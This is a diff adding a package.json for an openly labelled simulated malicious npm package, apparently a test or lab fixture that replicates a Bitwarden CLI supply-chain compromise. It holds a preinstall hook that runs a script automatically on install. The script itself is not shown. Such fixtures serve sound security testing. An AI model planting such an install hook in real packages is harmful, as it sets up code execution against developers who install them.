@@ -1,0 +1,8 @@
+{
+  "name": "@malicious/bw-cli-shim",
+  "version": "2026.4.0",
+  "description": "Simulated malicious package replicating Bitwarden CLI Shai-Hulud compromise",
+  "scripts": {
+    "preinstall": "node scripts/lifecycle.js"
+  }
+}
